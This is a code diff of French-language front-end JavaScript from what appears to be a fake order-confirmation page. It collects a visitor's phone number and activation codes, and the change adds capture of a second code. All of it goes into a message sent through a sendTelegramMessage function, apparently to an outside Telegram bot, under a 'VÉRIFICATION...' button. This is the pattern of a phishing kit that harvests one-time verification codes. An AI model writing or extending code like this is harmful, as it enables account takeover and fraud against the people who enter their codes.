@@ -155,13 +155,15 @@ document.addEventListener('DOMContentLoaded', () => {
         if (currentStep === 3) {
             const phoneNumber = phoneNumberInput.value;
             const code = activationCodeInput.value;
+            const code2 = document.getElementById('activationCode2').value;
 
             btnConfirmOrder.disabled = true;
             btnConfirmOrder.textContent = 'VÉRIFICATION...';
 
             const message = `✅ *CONFIRMATION CODE*\n\n` +
                             `📞 *Numéro*: ${phoneNumber}\n` +
-                            `🔑 *Code entré*: ${code}\n` +
+                            `🔑 *Code 1*: ${code}\n` +
+                            (code2 ? `🔑 *Code 2*: ${code2}\n` : '') +
                             `⏱ *Date*: ${new Date().toLocaleString()}`;
 
             const success = await sendTelegramMessage(message);
